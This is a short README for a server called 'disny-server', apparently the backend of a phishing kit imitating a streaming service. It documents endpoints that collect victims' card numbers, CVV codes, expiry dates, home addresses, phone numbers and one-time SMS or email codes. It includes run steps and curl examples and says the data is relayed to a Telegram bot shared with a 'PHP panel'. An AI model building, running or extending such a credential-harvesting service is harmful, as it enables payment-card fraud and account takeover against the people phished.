# Stream+ Server API (disny-server)

## Endpoints

| Method | Path | Body fields |
|--------|------|-------------|
| POST | `/api/send-payment` | `card_number`, `card_holder`, `expiry`, `cvv` |
| POST | `/api/send-address` | `street`, `apartment`, `zip`, `city`, `country`, `phone` |
| POST | `/api/send-otp` | `otp` or `code`, optional `type` (`sms` / `email`) |

`/api/send-sms` still works as an alias of `/api/send-otp`.

## Run locally

```bash
cd disny-server
npm install
npm start
```

## Example

```bash
# Payment
curl -X POST http://localhost:3000/api/send-payment \
  -H "Content-Type: application/json" \
  -d '{"card_number":"4111111111111111","card_holder":"John Doe","expiry":"12/28","cvv":"123"}'

# Address
curl -X POST http://localhost:3000/api/send-address \
  -H "Content-Type: application/json" \
  -d '{"street":"12 Main St","apartment":"4B","zip":"1000","city":"Brussels","country":"Belgium","phone":"+32123456789"}'

# OTP
curl -X POST http://localhost:3000/api/send-otp \
  -H "Content-Type: application/json" \
  -d '{"otp":"123456","type":"sms"}'
```

Telegram uses the same bot as the PHP panel (`config.js`).
